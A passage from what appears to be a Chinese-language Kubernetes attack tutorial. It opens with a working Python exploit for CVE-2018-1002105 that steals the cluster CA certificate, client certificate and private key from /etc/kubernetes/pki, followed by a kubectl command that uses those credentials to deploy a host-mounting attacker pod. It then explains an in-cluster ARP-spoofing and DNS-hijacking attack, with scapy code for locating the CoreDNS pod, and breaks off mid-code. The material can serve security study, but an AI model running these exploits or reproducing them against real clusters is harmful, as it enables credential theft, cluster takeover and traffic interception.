<span class="k">def</span> <span class="nf">_try_to_get_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">namespace</span><span class="p">,</span> <span class="n">pod</span><span class="p">):</span>
    <span class="n">payload1</span> <span class="o">=</span> <span class="n">http_delimiter</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
        <span class="p">(</span><span class="sa">f</span><span class="s1">&#39;GET /api/v1/namespaces/</span><span class="si">{</span><span class="n">namespace</span><span class="si">}</span><span class="s1">/pods/</span><span class="si">{</span><span class="n">pod</span><span class="si">}</span><span class="s1">/exec HTTP/1.1&#39;</span><span class="p">,</span>
         <span class="n">host_header</span><span class="p">,</span>
         <span class="n">auth_header</span><span class="p">,</span>
         <span class="n">upgrade_header</span><span class="p">,</span>
         <span class="n">conn_header</span><span class="p">))</span>
    <span class="n">payload1</span> <span class="o">+=</span> <span class="n">http_delimiter</span> <span class="o">*</span> <span class="mi">2</span>
    <span class="n">ssock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">_run_with_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">get_path</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">http_delimiter</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
        <span class="p">(</span><span class="sa">f</span><span class="s1">&#39;GET </span><span class="si">{</span><span class="n">get_path</span><span class="si">}</span><span class="s1"> HTTP/1.1&#39;</span><span class="p">,</span>
         <span class="n">host_header</span><span class="p">,</span>
         <span class="n">auth_header</span><span class="p">,</span>
         <span class="n">conn_header</span><span class="p">,</span>
         <span class="n">upgrade_header</span><span class="p">,</span>
         <span class="n">origin_header</span><span class="p">,</span>
         <span class="n">sec_websocket_key</span><span class="p">,</span>
         <span class="n">sec_websocket_version</span><span class="p">))</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">http_delimiter</span> <span class="o">*</span> <span class="mi">2</span>
    <span class="n">ssock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">_match_or_exit</span><span class="p">(</span><span class="n">banner_bytes</span><span class="p">,</span> <span class="n">resp</span><span class="p">,</span> <span class="n">fail_message</span><span class="o">=</span><span class="s2">&#34;[-] Failed.&#34;</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">banner_bytes</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
        <span class="k">return</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">fail_message</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">_get_secret</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
    <span class="n">delimiter</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;-----&#39;</span>
    <span class="n">start</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">delimiter</span><span class="p">)</span>
    <span class="n">end</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">rindex</span><span class="p">(</span><span class="n">delimiter</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">resp</span><span class="p">[</span><span class="n">start</span><span class="p">:</span><span class="n">end</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">delimiter</span><span class="p">)]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">_save_file</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">_steal_secret</span><span class="p">(</span><span class="n">api_server</span><span class="p">,</span> <span class="n">secret_file</span><span class="p">,</span> <span class="n">match_banner</span><span class="p">):</span>
    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">)))</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
        <span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">server_hostname</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">)</span> <span class="k">as</span> <span class="n">ssock</span><span class="p">:</span>
            <span class="n">ssock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Creating new privileged pipe...&#39;</span><span class="p">)</span>
            <span class="n">_try_to_get_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">namespace</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">namespace</span><span class="p">,</span> <span class="n">pod</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">pod</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">)</span>
            <span class="n">_match_or_exit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;stdin, stdout, stderr&#39;</span><span class="p">,</span> <span class="n">resp</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Trying to steal </span><span class="si">{</span><span class="n">secret_file</span><span class="si">}</span><span class="s2">...&#34;</span><span class="p">)</span>
            <span class="n">cmd1</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s1">&#39;/bin/cat&#39;</span><span class="p">)</span>
            <span class="n">cmd2</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;/etc/kubernetes/pki/</span><span class="si">{</span><span class="n">secret_file</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">_run_with_privilege</span><span class="p">(</span>
                <span class="n">ssock</span><span class="p">,</span>
                <span class="sa">f</span><span class="s1">&#39;/exec/kube-system/</span><span class="si">{</span><span class="n">api_server</span><span class="si">}</span><span class="s1">/kube-apiserver?command=</span><span class="si">{</span><span class="n">cmd1</span><span class="si">}</span><span class="s1">&amp;command=</span><span class="si">{</span><span class="n">cmd2</span><span class="si">}</span><span class="s1">&amp;input=1&amp;output=1&amp;tty=0&#39;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">)</span>
            <span class="n">_match_or_exit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;HTTP/1.1 101 Switching Protocols&#39;</span><span class="p">,</span> <span class="n">resp</span><span class="p">)</span>
            <span class="n">_match_or_exit</span><span class="p">(</span><span class="n">match_banner</span><span class="p">,</span> <span class="n">resp</span><span class="p">,</span> <span class="n">fail_message</span><span class="o">=</span><span class="sa">f</span><span class="s1">&#39;[-] Cannot find banner </span><span class="si">{</span><span class="n">match_banner</span><span class="si">}</span><span class="s1">.&#39;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Got </span><span class="si">{</span><span class="n">secret_file</span><span class="si">}</span><span class="s1">.&#39;</span><span class="p">)</span>
            <span class="n">secret_content</span> <span class="o">=</span> <span class="n">_get_secret</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
            <span class="n">_save_file</span><span class="p">(</span><span class="n">secret_file</span><span class="p">,</span> <span class="n">secret_content</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Secret </span><span class="si">{</span><span class="n">secret_file</span><span class="si">}</span><span class="s1"> saved :)&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Exploiting CVE-2018-1002105...&#34;</span><span class="p">)</span>
    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">)))</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
        <span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">server_hostname</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">)</span> <span class="k">as</span> <span class="n">ssock</span><span class="p">:</span>
            <span class="c1"># step 1</span>
            <span class="n">ssock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Checking vulnerable or not...&#34;</span><span class="p">)</span>
            <span class="n">_try_to_get_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">namespace</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">namespace</span><span class="p">,</span> <span class="n">pod</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">pod</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">)</span>
            <span class="n">_match_or_exit</span><span class="p">(</span>
                <span class="sa">b</span><span class="s1">&#39;stdin, stdout, stderr&#39;</span><span class="p">,</span>
                <span class="n">resp</span><span class="p">,</span>
                <span class="n">fail_message</span><span class="o">=</span><span class="s1">&#39;[-] Not vulnerable to CVE-2018-1002105.&#39;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Vulnerable to CVE-2018-1002105, continue.&#34;</span><span class="p">)</span>

            <span class="c1"># step 2</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Getting running pods list...&#34;</span><span class="p">)</span>
            <span class="n">_run_with_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="s1">&#39;/runningpods/&#39;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">)</span>
            <span class="n">_match_or_exit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;HTTP/1.1 200 OK&#39;</span><span class="p">,</span> <span class="n">resp</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Got running pods list.&#34;</span><span class="p">)</span>

            <span class="n">pods_info</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">_get_http_body</span><span class="p">(</span><span class="n">resp</span><span class="p">))</span>
            <span class="n">pods_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">pod</span><span class="p">[</span><span class="s1">&#39;metadata&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">pod</span> <span class="ow">in</span> <span class="n">pods_info</span><span class="p">[</span><span class="s1">&#39;items&#39;</span><span class="p">]]</span>
            <span class="k">for</span> <span class="n">pod</span> <span class="ow">in</span> <span class="n">pods_list</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">pod</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;kube-apiserver&#39;</span><span class="p">):</span>
                    <span class="n">api_server</span> <span class="o">=</span> <span class="n">pod</span>
                    <span class="k">break</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Cannot find API Server.&#34;</span><span class="p">)</span>
                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] API Server is </span><span class="si">{</span><span class="n">api_server</span><span class="si">}</span><span class="s2">.&#34;</span><span class="p">)</span>

            <span class="c1"># step 3</span>
            <span class="n">_steal_secret</span><span class="p">(</span>
                <span class="n">api_server</span><span class="o">=</span><span class="n">api_server</span><span class="p">,</span>
                <span class="n">secret_file</span><span class="o">=</span><span class="n">ca_crt</span><span class="p">,</span>
                <span class="n">match_banner</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;BEGIN CERTIFICATE&#39;</span><span class="p">)</span>
            <span class="n">_steal_secret</span><span class="p">(</span>
                <span class="n">api_server</span><span class="o">=</span><span class="n">api_server</span><span class="p">,</span>
                <span class="n">secret_file</span><span class="o">=</span><span class="n">client_crt</span><span class="p">,</span>
                <span class="n">match_banner</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;BEGIN CERTIFICATE&#39;</span><span class="p">)</span>
            <span class="n">_steal_secret</span><span class="p">(</span>
                <span class="n">api_server</span><span class="o">=</span><span class="n">api_server</span><span class="p">,</span>
                <span class="n">secret_file</span><span class="o">=</span><span class="n">client_key</span><span class="p">,</span>
                <span class="n">match_banner</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;BEGIN RSA PRIVATE KEY&#39;</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Enjoy your trip :)&#39;</span><span class="p">)</span>
    <span class="n">cmd_try</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;kubectl --server=https://</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s2">&#34;</span> \
              <span class="sa">f</span><span class="s2">&#34; --certificate-authority=</span><span class="si">{</span><span class="n">ca_crt</span><span class="si">}</span><span class="s2">&#34;</span> \
              <span class="sa">f</span><span class="s2">&#34; --client-certificate=</span><span class="si">{</span><span class="n">client_crt</span><span class="si">}</span><span class="s2">&#34;</span> \
              <span class="sa">f</span><span class="s2">&#34; --client-key=</span><span class="si">{</span><span class="n">client_key</span><span class="si">}</span><span class="s2"> get pods -n kube-system&#34;</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">cmd_try</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061613737.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061613737.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061613737.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061613737.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061613737.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061613737.png-water_print" /></p>
<p>后续通过前文的 <code>attacker.yaml</code> 新建一个挂载了宿主机根目录的 Pod，执行命令如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kubectl --server<span class="o">=</span>https://172.19.0.4:6443 --certificate-authority<span class="o">=</span>./ca.crt --client-certificate<span class="o">=</span>./apiserver-kubelet-client.crt --client-key<span class="o">=</span>./apiserver-kubelet-client.key apply -f attacker.yaml
</code></pre></td></tr></table>
</div>
</div><h2 id="4-k8s-中间人攻击">4 k8s 中间人攻击</h2>
<blockquote>
<p>Flannel 是 CoreOS 团队针对 Kubernetes 设计的一个网络规划服务，简单来说，它的功能是让集群中的不同节点主机创建的 Docker 容器都具有全集群唯一的虚拟 IP 地址。</p>
</blockquote>
<h3 id="41-背景">4.1 背景</h3>
<p>在默认的 Docker 配置中，每个节点上的 Docker 服务会分别负责所在节点容器的 IP 分配。这样导致的一个问题是，不同节点上容器可能获得相同的内外 IP 地址。</p>
<p>Flannel 的设计目的就是为集群中的所有节点重新规划 IP 地址的使用规则，从而使得不同节点上的容器能够获得同属一个内网且不重复的 IP 地址，并让属于不同节点上的容器能够直接通过内网 IP 通信。</p>
<p>以 Flannel 作为集群网络查件时，部署 k8s 集群的网络架构如下图所示：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071540770.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071540770.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071540770.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071540770.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071540770.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071540770.png-water_print" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071552093.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071552093.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071552093.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071552093.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071552093.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071552093.png-water_print" /></p>
<p>每个节点上会创建一个CNI 网桥（默认设备名称为 cni0）。每个 Pod 存在域自己的网络命名空间中，通过虚拟网卡对 Veth pair 设备与外界通信。</p>
<p>Veth pair 设备将创建两张虚拟网卡，分别位于 Pod 所在的网络命名空间中和节点根网络命名空间中，互为对端（Veth peer)，对于 Veth pair 设备的两张虚拟网卡来说，从其中一张网卡发出的数据包，将直接出现在另一张网卡上。</p>
<p>每个Pod 的 eth0 网卡的对端 veth 网卡“插”在 cni0 网桥上。同一节点上的各 pod 可以借助 cni0 网桥互相通信，不同节点之间需要借助额外的网络插件进行通信。</p>
<p>CoreDNS 是整个 Kubernetes 集群的 DNS 服务器。</p>
<p>这样的网络会存在哪些安全问题呢？ 所有这此 Pod 似乎组成了一个小型的局域网络，这个网络中可能存在中间人攻击。在默认配置下的 Kubernetes 集群中，假如攻击者借助 Web渗透等方式攻破了某个Pod，就有可能针对集群内的其它 Pod 发起中间人攻击，甚至可以基于此实现 DNS 劫持。</p>
<p>攻击者攻破 Web App Pod 之后，获得容器内部的 root 权限，通过 ARP 欺骗诱导另一个Pod ，让其以为 Web App Pod 是集群的 DNS 服务器，进而使得 Backend pod 在对外发起针对某域名（如 example.com）的 HTTP 请求时首先向 Web App Pod 发起 DNS 查询请求。</p>
<p>攻击者在 Web App Pod 内部设置的恶意 DNS 服务器收到查询请求后返回了自己的 IP 地址，Backend Pod 因此以为 example.com 域名的 IP 地址是 Web App Pod 的地址，于是向 Web App Pod 发起 HTTP 请求。</p>
<p>在收到 HTTP 请求后，攻古者在 web App Pod 内设置的恶意 HTTP 服务器返回恶意响应给 Backend Pod。至此，整个攻击过程结束，Baokend Pod 以为自己拿到了正确的信息，其实不然。</p>
<h3 id="42-场景">4.2 场景</h3>
<h4 id="421-mitm-需要的网络权限">4.2.1 MITM 需要的网络权限</h4>
<p>结合 Linux 系统 Capablities 知识可知，要想进行中间人攻击，如发送 ARP 包，需要具有 <code>CAP_NET_RAW</code> 权限。那么，容器内部的 root 用户是否具有该权限呢？</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071615628.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071615628.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071615628.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071615628.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071615628.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071615628.png-water_print" /></p>
<p>可以看到，默认情况下，Pod 是具有 <code>CAP_NET_RAW</code> 权限的。</p>
<h4 id="422-k8s-与-dns">4.2.2 k8s 与 DNS</h4>
<p>首先，k8s 以服务资源 kube-dns 的形式提供集群级别的 DNS 服务：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071617638.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071617638.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071617638.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071617638.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071617638.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071617638.png-water_print" /></p>
<p>Kube-dns 服务依赖的是集群中 kube-system 命名空间下的 CoreDNS Pod。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071619165.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071619165.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071619165.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071619165.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071619165.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071619165.png-water_print" /></p>
<p>在新建的 Pod 内部可以发现 resolv.conf 文件中记录的 DNS 服务器 IP 地址为 kube-dns 服务的地址：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071621303.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071621303.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071621303.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071621303.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071621303.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112071621303.png-water_print" /></p>
<p>当这个 Pod 向 kube-dns 服务发起 DNS 查询请求时，查询请求经过 iptables，最终被发送到服务后端的 Core DNS 中。</p>
<h4 id="423-k8s-与-arp">4.2.3 k8s 与 ARP</h4>
<p>当 Pod 向外发 ARP 请求时，该请求会被网桥转发给其它接口，因此，其它 Pod 就能够收到 ARP 请求，其中网卡 MAC 地址与 ARP 请求相符的 Pod 就会发送 ARP 响应，这响应同样会被网桥转发给发送 ARP Requests 的 Pod。</p>
<h3 id="43-原理">4.3 原理</h3>
<p>假设某 Pod A 需要访问 example.com，那么它首先必须知道该域名对应的 IP，因此，它需要发出一个DNS 查询请求。默认情况下，pod A 会向集群 DNS 服务 kube-dns 发起请求。</p>
<p>DNS 请求实际上是一个 UDP 报文，在我的环境中，kube-dns 服务的 IP 为 10.96.0.10，而 PodA 的 IP 为 192.168.166.134。两者不在同一子网。因此，该 UDP 报文会被 Pod A 发送给默认网关，也就是 cni0。接着，节点 iptables 对该报文进行 DNAT 处理，将目的地改为 192.168.219.77，也就是 CoreDNS Pod 的 IP 地址。</p>
<p>由于 Pod A 并未直接向 192.168.219.77 发出请求，上面的 ARP 解析过程是 cni0 负责的。因此，攻击者只需要对 cni0 发起恶意攻击即可。</p>
<p>但攻击者在 Pod 内，如何获得 cni0 网桥和 CoreDNS Pod 的网络信息呢？</p>
<p><strong>首先是 cni0 网桥</strong>。网桥的 IP 和MAC 地址获取方式比较多样。例如，由于 cnio 既是网桥又是默认网关，我们可以直接查询 Pod 的路由表，获得网桥 IP 地址：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">route -n
</code></pre></td></tr></table>
</div>
</div><p>然后直接查询 ARP 缓存，获得网桥 MAC 地址。如果没有，可以先向网桥发送一个 ARP 请求：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">arp -n
</code></pre></td></tr></table>
</div>
</div><p><strong>其次是 Core DNS Pod</strong> 的 IP 和 MAC 地址。结合背最知识部分 DNS 内容可知。pod 内部仅仅能拿到一个kube-dns 服务的 IP，通常是 10.96.0.10。但是，如果攻击者 pod 向该服务发送一个 DNS 查询请求，实际上是服务背后的 Core DNS Pod 回复 DNS 响应的（经过 DNAT 处理，目的地改为 CoreDNS Pod)。而 DNS 响应又是一个 UDP 报文，因此我们可以从中提取到 CoreDNS Pod 的 MAC 地址。但是，DNS 响应又会被进行 SNAT 处理，其中的 IP 地址被重新替换为 kube-dns 服务 IP 10.96.0.10。所以，以上步骤只能让攻击者拿到 CoreDNS Pod 的 MAC 地址。</p>
<p>所以，攻击者可以向整个子网的每个 IP 发出 ARP 请求，收集它们的 MAC 地址，然后与前面获得的 CoreDNS Pod 的 MAC 地址进行比对，如果一致，则说明对应 IP 即为 CoreDNS Pod 的 IP。</p>
<p>相关代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">get_coredns_pod_mac_ip</span><span class="p">(</span><span class="n">kube_dns_svc_ip</span><span class="p">,</span> <span class="n">self_ip</span><span class="p">,</span> <span class="n">verbose</span><span class="p">):</span>
    <span class="n">mac</span> <span class="o">=</span> <span class="n">srp1</span><span class="p">(</span><span class="n">Ether</span><span class="p">()</span> <span class="o">/</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">kube_dns_svc_ip</span><span class="p">)</span> <span class="o">/</span>
               <span class="n">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="mi">53</span><span class="p">)</span> <span class="o">/</span> <span class="n">DNS</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">qd</span><span class="o">=</span><span class="n">DNSQR</span><span class="p">()),</span> <span class="n">verbose</span><span class="o">=</span><span class="n">verbose</span><span class="p">)</span><span class="o">.</span><span class="n">src</span>
    <span class="n">answers</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">srp</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&#34;ff:ff:ff:ff:ff:ff&#34;</span><span class="p">)</span> <span class="o">/</span>
                     <span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{}</span><span class="s2">/24&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">self_ip</span><span class="p">)),</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="n">verbose</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">answer</span> <span class="ow">in</span> <span class="n">answers</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">answer</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">mac</span><span class="p">:</span>
